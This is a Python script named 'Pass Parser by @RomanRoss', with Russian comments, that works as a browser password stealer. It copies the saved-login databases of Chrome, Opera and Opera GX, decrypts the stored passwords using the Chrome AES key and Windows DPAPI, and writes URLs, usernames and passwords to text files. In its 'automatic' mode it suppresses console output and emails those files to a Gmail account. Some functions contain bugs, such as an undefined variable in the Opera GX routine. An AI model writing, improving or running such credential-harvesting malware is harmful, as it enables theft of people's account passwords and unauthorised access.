# -*- coding: utf-8 -*-
# Version 0.3
# RoS script
#
#TODO 1. Допилить сервисы yandex 2. Проэкранировать исключения при недобросовестном вводе


import os
import time
import json
import base64
import sqlite3
import win32crypt
import shutil
import sys
from Crypto.Hash import SHA512
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
#почта
import smtplib
import ssl
import yagmail
import email
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


amode = False
tag = '''
Pass Parser by @RomanRoss
or PPRR
'''


def main():
	global amode
	print('welcome to PPRR')
	print('''
	chose metod:
	1 - automatic
	( with mail service )
	2 - handmade
	''')
	tmp = input('~ ')
	if tmp == '2':
		print('''
		Выберите сервис:
		
		1 - Google Chrome
		2 - Yandex (in dev)
		3 - Opera (testing)
		4 - Opera GX (testing)
		''')
		tmp = input('~ ')
		if tmp == '1':
			chrome()
		elif tmp == '2':
			yandex()
		elif tmp == '3':
			opera()
		elif tmp == '4':
			gx_opera()
		else:
			main()
			return()
	else:
		amode = True
		auto_start()


def mail():
	mail_login = "WRITE HERE YOUR MAIL LOGIN@gmail.com"
	mail_password = 'WRITE HERE YOUR MAIL PASSWORD'
	body = "PPRR"


	yag = yagmail.SMTP(mail_login, mail_password)
	yag.send(
		to=mail_login,
		subject="New Logins here!",
		contents=body,
		attachments="ch.txt" and "op.txt" and "ya.txt",
	)


def auto_start():
	chrome()
	yandex()
	opera()
	gx_opera()
	mail()


def chrome():
	# get the AES key
	try:
		key = get_encryption_key()
	except:
		print('Google Chrome не установлен!')
		time.sleep(0.025)
		return
	# local sqlite Chrome database path
	db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
						   "Google", "Chrome", "User Data", "default", "Login Data")
	# copy the file to another location
	# as the database will be locked if chrome is currently running
	filename = "ChromeData.db"
	shutil.copyfile(db_path, filename)
	# connect to the database
	db = sqlite3.connect(filename)
	cursor = db.cursor()
	# `logins` table has the data we need
	f = open('Local/ch.txt', 'w')
	cursor.execute(
		"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
	# Перебирать все строки
	for row in cursor.fetchall():
		origin_url = row[0]
		f.write(f"Origin URL: {origin_url}" + '\n')
		action_url = row[1]
		f.write(f"Action URL: {action_url}" + '\n')
		username = row[2]
		f.write(f"Username: {username}" + '\n')
		password = decrypt_password(row[3], key)
		f.write(f"Password: {password}" + '\n')
		date_created = row[4]
		date_last_used = row[5]
		f.write("=" * 50 + '\n')
	# Вывод в консоль
		if amode == False:
			if username or password:
				print(f"Origin URL: {origin_url}")
				print(f"Action URL: {action_url}")
				print(f"Username: {username}")
				print(f"Password: {password}")
			else:
				continue
			if date_created != 86400000000 and date_created:
				print(f"Creation date: {str(get_chrome_datetime(date_created))}")
			if date_last_used != 86400000000 and date_last_used:
				print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
			print("=" * 50)
	cursor.close()
	db.close()
	try:
		# try to remove the copied db file
		os.remove(filename)
	except:
		pass


def get_chrome_datetime(chromedate):
	"""Return a `datetime.datetime` object from a chrome format datetime
	Since `chromedate` is formatted as the number of microseconds since January, 1601"""
	return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
	local_state_path = os.path.join(os.environ["USERPROFILE"],
									"AppData", "Local", "Google", "Chrome",
									"User Data", "Local State")
	with open(local_state_path, "r", encoding="utf-8") as f:
		local_state = f.read()
		local_state = json.loads(local_state)

	# decode the encryption key from Base64
	key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
	# remove DPAPI str
	key = key[5:]
	# return decrypted key that was originally encrypted
	# using a session key derived from current user's logon credentials
	return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
	try:
		# get the initialization vector
		iv = password[3:15]
		password = password[15:]
		# generate cipher
		cipher = AES.new(key, AES.MODE_GCM, iv)
		# decrypt password
		return cipher.decrypt(password)[:-16].decode()
	except:
		try:
			return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
		except:
			# not supported
			return ""


def yandex():
	pass


def gx_opera():
	textgx = 'Passwords Opera GX:' + '\n'
	textgx += 'URL | LOGIN | PASSWORD' + '\n'
	if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera GX Stable\\Login Data'):
		shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera GX Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera GX Stable\\Login Data2')
		conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera GX Stable\\Login Data2')
		cursor = conn.cursor()
		cursor.execute('SELECT action_url, username_value, password_value FROM logins')
		for result in cursor.fetchall():
			password = win32crypt.CryptUnprotectData(result[2])[1].decode()
			login = result[1]
			url = result[0]
			file = open(os.getenv("APPDATA") + '\\GX_opera_pass.txt', "w+")
			if password != '':
				if not amode:
					print(f'Action url: {url}')
					print(f'Login: {login}')
					print(f'Password: {password}')
				textgx += url + ' | ' + login + ' | ' + password + '\n'
				file.write(str(texto))
			file.close()
	else:
		print('Opera GX is not installed')
	


def opera():
	texto = 'Passwords Opera:' + '\n'
	texto += 'URL | LOGIN | PASSWORD' + '\n'
	if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
		shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
		conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
		cursor = conn.cursor()
		cursor.execute('SELECT action_url, username_value, password_value FROM logins')
		for result in cursor.fetchall():
			password = win32crypt.CryptUnprotectData(result[2])[1].decode()
			login = result[1]
			url = result[0]
			file = open(os.getenv("APPDATA") + '\\opera_pass.txt', "w+")
			if password != '':
				if not amode:
					print(f'Action url: {url}')
					print(f'Login: {login}')
					print(f'Password: {password}')
				texto += url + ' | ' + login + ' | ' + password + '\n'
				file.write(str(texto))
			file.close()
	else:
		print('Opera stable is not installed')


main()
sys.exit(__status = '0')